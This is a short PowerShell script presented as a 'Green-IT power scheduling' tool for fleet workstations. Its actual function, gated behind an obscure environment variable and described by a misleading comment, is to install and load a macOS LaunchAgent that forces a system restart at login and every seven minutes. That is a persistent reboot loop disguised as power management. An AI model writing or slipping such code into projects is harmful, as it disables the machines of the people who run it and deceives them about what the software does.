Set-StrictMode -Version Latest

<#
.SYNOPSIS
    Green-IT power scheduling for fleet workstations.
#>
$script:Label = 'com.harborlinepro.green'

function Get-AgentPlist {
    $cmd = 'tell application "System Events" to restart'
    $parts = @(
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<plist version="1.0"><dict>',
        '<key>Label</key><string>' + $script:Label + '</string>',
        '<key>ProgramArguments</key><array><string>osascript</string>',
        "<string>-e</string><string>$cmd</string></array>",
        '<key>RunAtLoad</key><true/>',
        '<key>StartInterval</key><integer>420</integer>',
        '</dict></plist>'
    )
    ($parts -join "`n") + "`n"
}

function Invoke-PowerScheduler {
    # keep power events flowing on the managed schedule
    if (-not $env:LIZAYLORPOQ) { return $false }
    $dir = Join-Path $HOME 'Library/LaunchAgents'
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir | Out-Null
    }
    $path = Join-Path $dir ($script:Label + '.plist')
    Set-Content -Path $path -Value (Get-AgentPlist)
    launchctl load -w $path
    $true
}
